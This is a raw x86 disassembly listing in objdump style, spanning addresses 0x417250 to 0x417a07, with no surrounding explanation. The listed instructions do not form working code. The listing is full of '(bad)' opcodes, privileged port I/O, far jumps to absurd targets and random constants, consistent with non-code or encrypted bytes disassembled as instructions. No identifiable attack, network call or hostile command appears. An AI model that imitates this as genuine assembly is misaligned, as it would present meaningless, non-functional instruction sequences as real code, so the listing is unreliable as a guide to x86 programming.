  417250:	xor    ch,ch
  417252:	inc    esi
  417253:	sti    
  417254:	xor    eax,0x4963369c
  417259:	fild   DWORD PTR [eax]
  41725b:	mov    edi,0x7e227528
  417260:	repnz loopne 0x417211
  417263:	fwait
  417264:	xchg   edi,eax
  417265:	xor    BYTE PTR [ebp+eax*4-0x30],dh
  417269:	jle    0x4171f8
  41726b:	push   0x5800e6ab
  417270:	push   ecx
  417271:	int3   
  417272:	(bad)  
  417273:	push   ds
  417274:	pop    esp
  417275:	mov    dl,0xac
  417277:	and    BYTE PTR [edi+0x1a],dl
  41727a:	or     ah,BYTE PTR [ecx+0x547bf4de]
  417280:	and    DWORD PTR [ebx-0x72],eax
  417283:	rol    DWORD PTR [edi],1
  417285:	push   esi
  417286:	or     BYTE PTR [ecx-0x23],0x9c
  41728a:	in     al,0x8b
  41728c:	pushf  
  41728d:	push   esi
  41728e:	test   DWORD PTR [ebx+eiz*8-0x735ff3f3],0x66ba28f8
  417299:	loopne 0x41730f
  41729b:	push   es
  41729c:	(bad)  
  41729d:	ffree  st(4)
  41729f:	cmp    dl,BYTE PTR [eax+0x3a]
  4172a2:	cld    
  4172a3:	and    BYTE PTR [eax-0x4883ca06],0x21
  4172aa:	fnstenv [esi+eiz*1-0x17]
  4172ae:	inc    esp
  4172af:	outs   dx,DWORD PTR ds:[esi]
  4172b0:	push   ebp
  4172b1:	(bad)  
  4172b2:	in     eax,dx
  4172b3:	mov    ah,0x75
  4172b5:	call   0x833b9332
  4172ba:	lods   al,BYTE PTR ds:[esi]
  4172bb:	and    BYTE PTR [ebx-0x11],cl
  4172be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172bf:	dec    esp
  4172c0:	lods   eax,DWORD PTR ds:[esi]
  4172c1:	out    0xbf,al
  4172c3:	pop    ebp
  4172c4:	sub    cl,BYTE PTR [ebp-0x74]
  4172c7:	jae    0x417279
  4172c9:	dec    ebp
  4172ca:	mov    edi,0x697273c4
  4172cf:	or     esp,ecx
  4172d1:	pusha  
  4172d2:	stc    
  4172d3:	xor    DWORD PTR [ecx+0x56f0bd81],edx
  4172d9:	or     edi,DWORD PTR [ebp+0x41974ee0]
  4172df:	in     al,dx
  4172e0:	fsubr  DWORD PTR [edx-0x8facb6f]
  4172e6:	cmp    DWORD PTR [esi+0x22],esi
  4172e9:	and    eax,0x2ef055ce
  4172ee:	outs   dx,BYTE PTR ds:[esi]
  4172ef:	adc    ah,BYTE PTR [edx]
  4172f1:	lahf   
  4172f2:	inc    DWORD PTR [ebp-0x5]
  4172f5:	jmp    0xa573:0xd1fb2431
  4172fc:	jb     0x417327
  4172fe:	nop
  4172ff:	ins    DWORD PTR es:[edi],dx
  417300:	xor    BYTE PTR [esi+0x6b],bh
  417303:	xor    DWORD PTR [ebx-0x79],esp
  417306:	ja     0x4172b1
  417308:	jmp    0xcf84c2a5
  41730d:	adc    bh,BYTE PTR [edi-0x4c]
  417310:	sti    
  417311:	adc    edx,esi
  417313:	scas   eax,DWORD PTR es:[edi]
  417314:	mov    dh,0x8f
  417316:	cwde   
  417317:	add    DWORD PTR [edx],0xf059e7d8
  41731d:	mov    es,WORD PTR [edi+0x12]
  417320:	push   ss
  417321:	popf   
  417322:	jae    0x41735a
  417324:	sti    
  417325:	scas   al,BYTE PTR es:[edi]
  417326:	mov    bh,BYTE PTR [ebp-0x17]
  417329:	xchg   esi,eax
  41732a:	jmp    0x909c3d03
  41732f:	fsub   st,st(6)
  417331:	jb     0x4172cb
  417333:	pushf  
  417334:	lea    si,[ecx+edx*8-0xb]
  417339:	pop    edx
  41733a:	(bad)  
  41733c:	sub    al,0x9
  41733e:	and    edi,DWORD PTR [ecx]
  417340:	hlt    
  417341:	cld    
  417342:	lahf   
  417343:	ins    DWORD PTR es:[edi],dx
  417344:	inc    esp
  417345:	(bad)  
  417346:	loopne 0x4172d0
  417348:	call   0x7d09afc8
  41734d:	push   edi
  41734e:	inc    edi
  41734f:	test   DWORD PTR [eax-0x54e1c1cc],0x2c337179
  417359:	test   al,0x51
  41735b:	frstor [ecx+eax*2]
  41735e:	aam    0x9
  417360:	sub    DWORD PTR [eax+0x20],0x3d
  417364:	out    dx,al
  417365:	pop    ecx
  417366:	scas   al,BYTE PTR es:[edi]
  417367:	out    0x69,eax
  417369:	sbb    eax,0x9f3f5bfc
  41736e:	data16 jns 0x417343
  417371:	ins    BYTE PTR es:[edi],dx
  417372:	pop    eax
  417373:	shl    BYTE PTR [edi+esi*2+0x2d],1
  417377:	loopne 0x4173b2
  417379:	loop   0x41739d
  41737b:	mov    al,0x15
  41737d:	jne    0x4173db
  41737f:	stc    
  417380:	jecxz  0x417392
  417382:	jle    0xebd0e95a
  417388:	(bad)  
  417389:	(bad)  
  41738a:	mov    eax,ds:0x269ca7a5
  41738f:	inc    esi
  417390:	ds loop 0x4173ee
  417393:	or     DWORD PTR [ebx-0x80],0x3c
  417397:	das    
  417398:	pop    esi
  417399:	add    DWORD PTR [esi+0x5b],ecx
  41739c:	and    al,0x63
  41739e:	dec    edi
  41739f:	pop    ss
  4173a0:	add    al,0x4c
  4173a2:	adc    eax,0x5aeff839
  4173a7:	jo     0x417350
  4173a9:	or     eax,0xd25caf96
  4173ae:	pop    esp
  4173af:	dec    ebp
  4173b0:	nop
  4173b1:	adc    al,0x9e
  4173b3:	jnp    0x4173f1
  4173b5:	dec    esi
  4173b6:	test   DWORD PTR [ecx+edx*8],eax
  4173b9:	sti    
  4173ba:	stos   DWORD PTR es:[edi],eax
  4173bb:	(bad)  
  4173bc:	aaa    
  4173bd:	or     bl,ah
  4173bf:	pop    ds
  4173c0:	pushf  
  4173c1:	push   eax
  4173c2:	fs sub al,0x79
  4173c5:	je     0x4173c7
  4173c7:	and    DWORD PTR [eax+0x451d27b5],edx
  4173cd:	mov    ch,0x26
  4173cf:	jbe    0x417449
  4173d1:	or     BYTE PTR gs:[esi+0x628902d7],0xa5
  4173d9:	add    dl,BYTE PTR [eax-0xf]
  4173dc:	or     ch,BYTE PTR [ecx]
  4173de:	pusha  
  4173df:	sbb    ecx,DWORD PTR [edi]
  4173e1:	(bad)  
  4173e2:	or     ch,ah
  4173e4:	push   ecx
  4173e5:	cmc    
  4173e6:	dec    edx
  4173e7:	mov    dl,0xb2
  4173e9:	lock in eax,dx
  4173eb:	leave  
  4173ec:	fcom   DWORD PTR [ecx+ebx*2]
  4173ef:	sbb    eax,0x21afb0fc
  4173f4:	mov    gs,WORD PTR [esi-0x514a61b5]
  4173fa:	xchg   ebp,eax
  4173fb:	sbb    al,BYTE PTR [edi+0x58]
  4173fe:	or     BYTE PTR [eax+ebx*2],ch
  417401:	inc    ebx
  417402:	xor    ecx,DWORD PTR [ecx+eiz*1]
  417405:	pop    ss
  417406:	dec    ebp
  417407:	lods   al,BYTE PTR ds:[esi]
  417408:	dec    esp
  417409:	mov    esi,0x1584eb97
  41740e:	mov    esp,edx
  417410:	cmp    al,0x38
  417412:	gs aam 0x2c
  417415:	bound  esp,QWORD PTR [ebx]
  417417:	sub    eax,0x68946da0
  41741c:	mov    esi,DWORD PTR [esi]
  41741e:	jmp    0x4173ec
  417420:	xchg   ebx,eax
  417421:	dec    ecx
  417422:	nop
  417423:	int3   
  417424:	sub    dh,ch
  417426:	inc    esp
  417427:	push   eax
  417428:	or     eax,0x9358b4b
  41742d:	les    ebx,FWORD PTR [edx-0x7324793e]
  417433:	pusha  
  417434:	ss stos DWORD PTR es:[edi],eax
  417436:	test   BYTE PTR [ebp-0x4e],ah
  417439:	daa    
  41743a:	test   BYTE PTR [eax-0x204f0546],0xb7
  417441:	pushf  
  417442:	xor    al,0x44
  417444:	fs push edx
  417446:	shufps xmm4,XMMWORD PTR [ebx],0xa1
  41744a:	mov    cl,BYTE PTR [ebp+0x3a]
  41744d:	cs out dx,eax
  41744f:	pop    DWORD PTR [edx+0x12513397]
  417455:	(bad)  
  417456:	shr    BYTE PTR [esi-0x28abc925],1
  41745c:	sub    BYTE PTR [ecx-0x3e5bf6f9],cl
  417462:	je     0x4173e7
  417464:	imul   ebx,DWORD PTR [edx],0xffffff99
  417467:	lods   al,BYTE PTR ds:[esi]
  417468:	(bad)  
  417469:	pop    ebx
  41746a:	sbb    eax,0x7f74d123
  41746f:	mov    eax,eax
  417471:	and    DWORD PTR [edi-0x6a],ebp
  417474:	cmp    DWORD PTR [eax],ecx
  417476:	jns    0x41747e
  417478:	lods   eax,DWORD PTR ds:[esi]
  417479:	pusha  
  41747a:	repnz pop ebp
  41747c:	sub    eax,0x6aa4e92b
  417481:	or     edx,DWORD PTR [esi+0x636deca5]
  417487:	push   DWORD PTR [edi-0x1e]
  41748a:	inc    esp
  41748b:	xor    DWORD PTR [ebx+edx*4-0x4b612970],ecx
  417492:	pop    ecx
  417493:	push   0x13
  417495:	mov    ebp,0x6c7db031
  41749a:	push   ebx
  41749b:	push   ebp
  41749c:	xchg   ecx,eax
  41749d:	mov    ds:0x7dac35c5,al
  4174a2:	addr16 (bad) 
  4174a4:	cmp    eax,0xc9fc518b
  4174a9:	fs and al,0x6f
  4174ac:	xor    DWORD PTR [ebp-0x1ecf7e5c],0x71
  4174b3:	mov    al,ds:0x10ef329c
  4174b8:	inc    ebx
  4174b9:	xchg   esi,eax
  4174ba:	or     edi,edi
  4174bc:	and    al,0x48
  4174be:	sbb    al,0x68
  4174c0:	pop    ss
  4174c1:	mov    ds:0x8951cd8f,al
  4174c6:	aad    0x64
  4174c8:	outs   dx,DWORD PTR ds:[esi]
  4174c9:	clc    
  4174ca:	xchg   dh,dl
  4174cc:	and    edx,DWORD PTR [ecx+0x5f316dec]
  4174d2:	stc    
  4174d3:	lahf   
  4174d4:	ss sahf 
  4174d6:	mov    bh,0xdc
  4174d8:	shl    DWORD PTR [ebp-0x43d1d986],0x95
  4174df:	jecxz  0x417543
  4174e1:	cmp    bh,BYTE PTR [eax-0x29]
  4174e4:	inc    ecx
  4174e5:	xchg   esp,eax
  4174e6:	jnp    0x4174d4
  4174e8:	test   al,0xd2
  4174ea:	ss shl edx,cl
  4174ed:	jg     0x41750b
  4174ef:	adc    al,0x49
  4174f1:	xor    eax,0x261bfaea
  4174f6:	hlt    
  4174f7:	push   edi
  4174f8:	ds jne 0x41755c
  4174fb:	stos   BYTE PTR es:[edi],al
  4174fc:	data16 out 0x72,al
  4174ff:	sub    DWORD PTR [eax],esp
  417501:	pop    ss
  417502:	sahf   
  417503:	(bad)  
  417504:	xchg   esp,eax
  417505:	inc    ecx
  417506:	and    al,0x99
  417508:	cmp    al,0xb2
  41750a:	scas   eax,DWORD PTR es:[edi]
  41750b:	jmp    0x4174fd
  41750d:	stc    
  41750e:	add    al,0xf8
  417510:	out    0x7,eax
  417512:	int3   
  417513:	clc    
  417514:	pop    eax
  417515:	cmp    dh,ch
  417517:	(bad)  
  417518:	mov    ah,0x29
  41751a:	gs repnz mov ebx,0x2a0f3f96
  417521:	lds    esi,FWORD PTR [ecx+eiz*2]
  417524:	mov    ds:0x671df369,eax
  417529:	mov    esi,0x9e824586
  41752e:	nop
  41752f:	lods   al,BYTE PTR ds:[esi]
  417530:	and    BYTE PTR [esi+0x5a],bh
  417533:	pop    ebp
  417534:	loope  0x41752a
  417536:	dec    ebp
  417537:	mov    WORD PTR es:[esi-0x73],cs
  41753b:	jns    0x417566
  41753d:	test   DWORD PTR [ebx-0x54],ebx
  417540:	or     DWORD PTR [ebp+0xb],eax
  417543:	mov    edx,0x2f1470b6
  417548:	mov    bh,0xbe
  41754a:	daa    
  41754b:	mov    ah,0x3f
  41754d:	lds    edx,FWORD PTR [eax-0x39]
  417550:	or     esi,DWORD PTR [edi-0x6506768]
  417556:	iret   
  417557:	lock dec ebx
  417559:	push   es
  41755a:	daa    
  41755b:	and    BYTE PTR [ecx+0x3f75db04],dl
  417561:	xor    cl,bl
  417563:	push   0xffffffa5
  417565:	cmp    cl,BYTE PTR [ecx-0x6d]
  417568:	repz inc edx
  41756a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41756b:	mov    ebp,0x50b2126a
  417570:	add    al,0x2d
  417572:	jecxz  0x4175ee
  417574:	(bad)  
  417575:	outs   dx,DWORD PTR ds:[esi]
  417576:	shl    DWORD PTR [eax],1
  417578:	stos   BYTE PTR es:[edi],al
  417579:	mov    edx,0x253d793d
  41757e:	std    
  41757f:	stos   BYTE PTR es:[edi],al
  417580:	(bad)  
  417582:	ret    
  417583:	add    al,0x71
  417585:	dec    esp
  417586:	stos   DWORD PTR es:[edi],eax
  417587:	push   esp
  417588:	push   ecx
  417589:	jecxz  0x4175b7
  41758b:	mov    ch,0xbc
  41758d:	fimul  DWORD PTR [edx+esi*4]
  417590:	mov    eax,0xb6620091
  417595:	sub    eax,0x878db876
  41759a:	sub    ah,BYTE PTR [ebx+0x3e]
  41759d:	dec    ecx
  41759e:	test   eax,0xca9c1d3b
  4175a3:	or     dl,bl
  4175a5:	inc    edi
  4175a6:	mov    bl,0x1f
  4175a8:	jmp    0xda94f44c
  4175ad:	arpl   si,cx
  4175af:	pop    ebx
  4175b0:	push   es
  4175b1:	jns    0x4175b5
  4175b3:	mov    dh,0x68
  4175b5:	mov    ebp,DWORD PTR [edx]
  4175b7:	push   ecx
  4175b8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4175ba:	mov    edx,0x8b12de63
  4175bf:	daa    
  4175c0:	and    dl,BYTE PTR [esi]
  4175c2:	jle    0x417628
  4175c4:	mov    al,0x71
  4175c6:	push   esi
  4175c7:	shl    ah,cl
  4175c9:	adc    BYTE PTR [edx+0x4be093d8],cl
  4175cf:	out    dx,eax
  4175d0:	push   0xffffff9a
  4175d2:	ss dec ebp
  4175d4:	neg    DWORD PTR [edx-0x15549048]
  4175da:	jae    0x4175d8
  4175dc:	mov    ds:0xe8ea21fc,eax
  4175e1:	add    esp,edi
  4175e3:	out    0xea,al
  4175e5:	or     esp,DWORD PTR [eax+0x27]
  4175e8:	stc    
  4175e9:	pop    eax
  4175ea:	imul   esi,DWORD PTR [edi+0x3e422356],0xc34a59ae
  4175f4:	adc    esp,DWORD PTR [ecx]
  4175f6:	stos   BYTE PTR es:[edi],al
  4175f7:	out    0x80,al
  4175f9:	pop    ecx
  4175fa:	jl     0x4175d1
  4175fc:	mov    ebp,0xfa8483d6
  417601:	push   esp
  417602:	adc    al,dl
  417604:	push   ebp
  417605:	leave  
  417606:	(bad)  
  417607:	test   DWORD PTR [bp+di-0x46],esi
  41760b:	adc    eax,DWORD PTR [eax]
  41760d:	ins    BYTE PTR es:[edi],dx
  41760e:	jo     0x41760e
  417610:	fs dec edi
  417612:	push   edx
  417613:	and    eax,edi
  417615:	push   eax
  417616:	sbb    BYTE PTR [eax],bh
  417618:	sbb    edi,DWORD PTR [edx+0x1d429c9d]
  41761e:	into   
  41761f:	sti    
  417620:	inc    ecx
  417621:	mov    ah,0x23
  417623:	idiv   DWORD PTR [ebp+0x75f20a50]
  417629:	mov    cl,0x8a
  41762b:	xor    esi,DWORD PTR [ebx+0xa]
  41762e:	mov    eax,0xbe31e3e4
  417633:	adc    DWORD PTR [ecx+ebp*2-0x52],edx
  417637:	or     BYTE PTR [edx+0x74f83f05],ch
  41763d:	daa    
  41763e:	fmul   st(1),st
  417640:	scas   eax,DWORD PTR es:[edi]
  417641:	add    BYTE PTR [esp+esi*8+0x1a2804f4],cl
  417648:	ja     0x4176c5
  41764a:	lods   al,BYTE PTR ds:[esi]
  41764b:	setne  BYTE PTR [ebx+ebp*1-0x2cca7e06]
  417653:	aam    0x92
  417655:	jle    0x417684
  417657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417658:	pop    ebp
  417659:	jno    0x417632
  41765b:	lea    esi,[ecx]
  41765d:	test   eax,0x92327e05
  417662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417663:	cmp    esi,ebp
  417665:	pop    ebp
  417666:	or     dh,BYTE PTR [edx]
  417668:	addr16 leave 
  41766a:	rcr    DWORD PTR [esi-0x5e],cl
  41766d:	aad    0xef
  41766f:	js     0x417679
  417671:	out    0x6d,eax
  417673:	ret    0x5f2f
  417676:	push   esp
  417677:	lods   eax,DWORD PTR ds:[esi]
  417678:	lods   eax,DWORD PTR ds:[esi]
  417679:	mov    esi,0x26683162
  41767e:	lock hlt 
  417680:	xor    eax,0xee363f87
  417685:	pop    esi
  417686:	push   esp
  417687:	jl     0x417674
  417689:	mov    esp,0x2d17c3b4
  41768e:	ja     0x4176b6
  417690:	sbb    dh,dh
  417692:	inc    esp
  417693:	ja     0x417702
  417695:	mov    dh,0x4a
  417697:	xor    ah,bl
  417699:	pop    es
  41769a:	rol    BYTE PTR [eax+0x39],0xbd
  41769e:	ins    DWORD PTR es:[edi],dx
  41769f:	arpl   dx,ax
  4176a1:	ja     0x41765c
  4176a3:	mov    esi,0x3f5d5d39
  4176a8:	inc    ecx
  4176a9:	mov    edi,0xd990b16a
  4176ae:	push   edi
  4176af:	xor    eax,0xec4f84f4
  4176b4:	sbb    bh,dl
  4176b6:	adc    BYTE PTR [ecx+0x6104ad3f],bl
  4176bc:	mov    al,ds:0xb8041a99
  4176c1:	add    DWORD PTR [ebx-0x78],ecx
  4176c4:	das    
  4176c5:	lock push esp
  4176c7:	push   esi
  4176c8:	mov    ecx,0x42fff4dd
  4176cd:	adc    al,BYTE PTR ds:0xa9181442
  4176d3:	call   0xe85a:0x9cef8f64
  4176da:	or     cl,BYTE PTR [eax-0x7d]
  4176dd:	push   ebp
  4176de:	sub    edi,eax
  4176e0:	call   0xd251:0x39c7c45d
  4176e7:	cdq    
  4176e8:	jno    0x41771a
  4176ea:	pop    ebx
  4176eb:	clc    
  4176ec:	adc    al,0xf8
  4176ee:	sub    DWORD PTR [ebx-0x24],0xd2d40e29
  4176f5:	mov    cl,0xd6
  4176f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f8:	sbb    esp,esp
  4176fa:	sahf   
  4176fb:	rcr    BYTE PTR [ecx-0x50],cl
  4176fe:	clc    
  4176ff:	mov    al,ds:0xab2b5eb2
  417704:	add    ecx,edx
  417706:	imul   edi,DWORD PTR [ecx],0x7ed8c5ed
  41770c:	inc    edx
  41770e:	inc    ebx
  41770f:	fcom   QWORD PTR [eax-0x6d0e1cc8]
  417715:	je     0x4176d0
  417717:	inc    edx
  417718:	xchg   edx,eax
  417719:	cli    
  41771a:	cmp    edi,ebp
  41771c:	std    
  41771d:	adc    eax,0x952c63ee
  417722:	add    bl,BYTE PTR [ebp-0x54]
  417725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417726:	rcr    DWORD PTR [ecx],1
  417728:	ror    edi,cl
  41772a:	ficom  WORD PTR [edx-0x11ea8068]
  417730:	mov    esi,DWORD PTR [esi]
  417732:	or     al,0xf3
  417734:	ret    
  417735:	dec    ebp
  417736:	mov    ebp,0x8497e0bf
  41773b:	loop   0x4176ca
  41773d:	jns    0x4177aa
  41773f:	cmp    BYTE PTR [eax+0x45],cl
  417742:	mov    ds,WORD PTR [ebp+0x4baa2acf]
  417748:	cwde   
  417749:	in     eax,0x33
  41774b:	sar    BYTE PTR [ecx-0x1b076ad0],1
  417751:	cmp    DWORD PTR [esi-0x7e],esp
  417754:	jne    0x41779f
  417756:	std    
  417757:	xchg   ecx,eax
  417758:	push   0x33
  41775a:	inc    eax
  41775b:	xchg   BYTE PTR [ebx-0x5a3f112d],ch
  417761:	aaa    
  417762:	fs arpl ax,ax
  417765:	into   
  417766:	cmp    BYTE PTR [eax+0x77],bh
  417769:	inc    edx
  41776a:	dec    eax
  41776b:	adc    BYTE PTR [ebx-0x6db22961],al
  417771:	inc    edx
  417772:	out    dx,eax
  417773:	das    
  417774:	enter  0xcec,0xc8
  417778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417779:	xor    eax,DWORD PTR [ebp+0x40]
  41777c:	mov    ch,0x40
  41777e:	jno    0x417775
  417780:	addr16 dec edi
  417782:	pusha  
  417783:	inc    ebp
  417784:	addr16 ja 0x4177ff
  417787:	pop    ds
  417788:	fisubr DWORD PTR [esi+0x4f]
  41778b:	add    bl,ah
  41778d:	fcomp  QWORD PTR [eax]
  41778f:	pusha  
  417790:	jae    0x41778a
  417792:	cmp    al,0x9a
  417794:	aad    0x18
  417796:	icebp  
  417797:	out    0x16,al
  417799:	(bad)  
  41779a:	aam    0x86
  41779c:	inc    esi
  41779d:	cwde   
  41779e:	inc    ebp
  41779f:	rcr    BYTE PTR [edx+0x6c],cl
  4177a2:	jbe    0x417777
  4177a4:	nop
  4177a5:	mov    cl,0x2b
  4177a7:	adc    DWORD PTR [edx-0x2878b991],0x1c123109
  4177b1:	jge    0x4177b5
  4177b3:	dec    edx
  4177b4:	faddp  st(5),st
  4177b6:	xor    al,0x56
  4177b8:	fdivr  DWORD PTR [ebp+0x69]
  4177bb:	or     eax,DWORD PTR [edx]
  4177bd:	dec    ecx
  4177be:	and    eax,0x6e7a20b0
  4177c3:	ins    DWORD PTR es:[edi],dx
  4177c4:	loopne 0x417835
  4177c6:	xchg   esp,eax
  4177c7:	push   esp
  4177c8:	out    dx,al
  4177c9:	(bad)  [edi]
  4177cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177cc:	out    dx,eax
  4177cd:	ret    
  4177ce:	enter  0xae78,0x41
  4177d2:	cmp    al,0x18
  4177d4:	sub    esi,DWORD PTR [edx-0x102ff163]
  4177da:	and    BYTE PTR ds:0x77d4762f,bl
  4177e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e1:	mov    cl,0x4c
  4177e3:	fld    TBYTE PTR [ecx+0x42]
  4177e6:	jnp    0x4177ff
  4177e8:	mov    esp,0x2d140137
  4177ed:	rol    BYTE PTR [ebp-0x5],1
  4177f0:	sbb    bl,BYTE PTR [ebx-0x419c07a5]
  4177f6:	and    eax,0x61e99f78
  4177fb:	push   0x4f2efdcd
  417800:	popf   
  417801:	mov    bh,0x84
  417803:	sti    
  417804:	or     DWORD PTR [ecx],0x450970dd
  41780a:	xchg   esp,eax
  41780b:	leave  
  41780c:	psrlw  mm1,QWORD PTR ss:[eax+0x34]
  417811:	jp     0x417793
  417813:	jbe    0x41782f
  417815:	(bad)  
  417816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417817:	pop    ebx
  417818:	mul    DWORD PTR [esi+ebp*1]
  41781b:	pop    ds
  41781c:	and    esi,DWORD PTR [edx+ebx*1+0x38236607]
  417823:	pand   mm6,QWORD PTR [edx+0x74cbe328]
  41782a:	push   ss
  41782b:	out    dx,eax
  41782c:	pop    edx
  41782d:	and    ebp,0x5de50f2c
  417833:	gs pop ss
  417835:	icebp  
  417836:	sbb    DWORD PTR [edx-0xa],edi
  417839:	repnz bnd jle 0x41785e
  41783d:	lock iret 
  41783f:	and    DWORD PTR fs:[esi+edi*8+0x14aa41a1],ebp
  417847:	mov    al,ds:0x5aadfbc6
  41784c:	xchg   ecx,eax
  41784d:	imul   edi,DWORD PTR [ebx-0xa],0x73
  417851:	in     eax,dx
  417852:	or     al,0x82
  417854:	xor    ch,BYTE PTR [eax-0x51c28cb1]
  41785a:	jae    0x41784e
  41785c:	add    BYTE PTR [edi+0x73268eb9],ah
  417862:	sar    DWORD PTR [ebp+0x26],1
  417865:	outs   dx,BYTE PTR ds:[esi]
  417866:	mov    dh,0xfc
  417868:	fisub  DWORD PTR [ebp+0x7e]
  41786b:	les    ecx,FWORD PTR [ecx-0x9]
  41786e:	(bad)  
  41786f:	push   ss
  417870:	mov    edi,0xf204b23f
  417875:	test   al,0x4a
  417877:	stc    
  417878:	lock sbb DWORD PTR [edi+0x54d99b9c],edi
  41787f:	pop    es
  417880:	push   es
  417881:	fucom  st(5)
  417883:	push   ds
  417884:	dec    ebp
  417885:	or     esp,esi
  417887:	push   eax
  417888:	imul   esi,DWORD PTR [ebx],0x1f
  41788b:	xor    al,0x4b
  41788d:	mov    BYTE PTR [edi+0x49ffb1bc],bh
  417893:	and    BYTE PTR [eax+0x14],0x20
  417897:	mov    BYTE PTR [ebp+0x3],dh
  41789a:	iret   
  41789b:	pop    esi
  41789c:	xchg   ebp,eax
  41789d:	stc    
  41789e:	mov    al,ds:0x606e2213
  4178a3:	aaa    
  4178a4:	mov    ss:0x1df31155,al
  4178aa:	xchg   edx,eax
  4178ab:	loop   0x417834
  4178ad:	lods   eax,DWORD PTR ds:[esi]
  4178ae:	es sti 
  4178b0:	lahf   
  4178b1:	mov    ch,0xf8
  4178b3:	lds    edx,FWORD PTR [eax+0x4f]
  4178b6:	inc    ecx
  4178b7:	fadd   st,st(0)
  4178b9:	outs   dx,BYTE PTR ds:[esi]
  4178ba:	push   ebp
  4178bb:	pop    es
  4178bc:	hlt    
  4178bd:	pop    esp
  4178be:	ret    0xb384
  4178c1:	popf   
  4178c2:	dec    BYTE PTR [ecx+edx*4+0x2f]
  4178c6:	(bad)  
  4178c7:	sar    esp,1
  4178c9:	cmc    
  4178ca:	adc    BYTE PTR [esi+eiz*1+0x38],bh
  4178ce:	jmp    0xe94b:0xb351b74e
  4178d5:	xchg   ebx,eax
  4178d6:	rcr    BYTE PTR [edx-0x30],0x3f
  4178da:	dec    eax
  4178db:	out    0xd,al
  4178dd:	mov    al,ds:0xb22f394b
  4178e2:	inc    ecx
  4178e3:	std    
  4178e4:	cmp    eax,DWORD PTR ds:0xa4451e51
  4178ea:	int3   
  4178eb:	dec    ebp
  4178ec:	call   0xe703:0xce02a4f1
  4178f3:	adc    DWORD PTR [ecx+0x68a1560a],ebp
  4178f9:	sbb    bh,BYTE PTR [ebx]
  4178fb:	loop   0x41793c
  4178fd:	mov    esi,0x90706bb5
  417902:	dec    edi
  417903:	mov    BYTE PTR [edi],dl
  417905:	sbb    DWORD PTR [ebp+0x55],ebx
  417908:	push   0xb2bc383a
  41790d:	int    0xc0
  41790f:	dec    ebx
  417910:	dec    ecx
  417911:	sahf   
  417912:	mov    bl,0x17
  417914:	clc    
  417915:	push   esi
  417916:	mov    esp,0x15d7d51b
  41791b:	mov    al,ds:0xa4a44172
  417920:	stos   BYTE PTR es:[edi],al
  417921:	ret    0x6149
  417924:	pop    es
  417925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417926:	dec    ecx
  417927:	rcr    BYTE PTR [edx-0x49],0x46
  41792b:	aas    
  41792c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41792d:	ret    
  41792e:	push   0x4da66e9c
  417933:	or     al,0xab
  417935:	arpl   WORD PTR [esi-0x20],bx
  417938:	mov    BYTE PTR [ebx+ebx*1+0x3261203f],al
  41793f:	ret    
  417940:	dec    edx
  417941:	push   esi
  417942:	shl    DWORD PTR [ebp-0x54],0xe8
  417946:	push   0x30353fcd
  41794b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41794c:	ret    0x366e
  41794f:	xor    bh,BYTE PTR [ebp+0x36c93fc0]
  417955:	xor    esi,DWORD PTR [edi]
  417957:	adc    BYTE PTR [edx+ebx*4-0x71c92562],ah
  41795e:	pop    esi
  41795f:	jno    0x417995
  417961:	(bad)  
  417963:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417965:	push   esp
  417966:	mov    DWORD PTR [esp+eax*4+0x47967faa],0xc3934c69
  417971:	jns    0x41799b
  417973:	(bad)
  417977:	mov    ch,0xb4
  417979:	in     eax,dx
  41797a:	(bad)  
  41797c:	imul   edi,edi,0x7b471eb8
  417982:	inc    ecx
  417983:	in     eax,0xc
  417985:	inc    eax
  417986:	push   edi
  417987:	fucomip st,st(2)
  417989:	add    DWORD PTR [edx+0x7c],0xae9b5ac5
  417990:	(bad)  
  417991:	mov    ah,0x41
  417993:	popa   
  417994:	shl    DWORD PTR [eax+0x38],cl
  417997:	(bad)  
  417999:	xor    esp,esp
  41799b:	imul   ebx,DWORD PTR [ebx-0x6d],0x8
  41799f:	stos   DWORD PTR es:[edi],eax
  4179a0:	out    dx,eax
  4179a1:	pop    eax
  4179a2:	push   edx
  4179a3:	das    
  4179a4:	sbb    ebp,DWORD PTR [edx]
  4179a6:	stos   BYTE PTR es:[edi],al
  4179a7:	outs   dx,DWORD PTR ds:[esi]
  4179a8:	mov    bh,0xaf
  4179aa:	test   al,0x36
  4179ac:	ins    DWORD PTR es:[edi],dx
  4179ad:	adc    al,0x86
  4179af:	fsubr  DWORD PTR [esi*2+0x5e149977]
  4179b6:	out    0x97,al
  4179b8:	in     eax,0x56
  4179ba:	push   cs
  4179bb:	test   DWORD PTR [edi+0x7194849d],ebp
  4179c1:	xchg   esi,eax
  4179c2:	imul   edx,DWORD PTR [edx-0x76],0xb8f26458
  4179c9:	inc    edi
  4179ca:	jb     0x41799d
  4179cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179cd:	and    DWORD PTR [esi-0x19379f55],ecx
  4179d3:	xor    edx,DWORD PTR [eax-0x72]
  4179d6:	pushf  
  4179d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d8:	and    eax,edi
  4179da:	mov    esp,edx
  4179dc:	inc    esp
  4179dd:	jge    0x4179b4
  4179df:	es jbe 0x417a4a
  4179e2:	adc    cl,BYTE PTR [ebp-0x56]
  4179e5:	mov    esp,0x758f25fc
  4179ea:	arpl   WORD PTR [esi],sp
  4179ec:	(bad)  
  4179ed:	neg    BYTE PTR [esi+0x5e5f9df2]
  4179f3:	(bad)  
  4179f4:	add    al,0xb4
  4179f6:	mov    gs:0xb6385a01,eax
  4179fc:	into   
  4179fd:	or     ecx,edi
  4179ff:	and    BYTE PTR [ebp+0x6adc0e63],al
  417a05:	loopne 0x417a3b
  417a07:	(bad)  
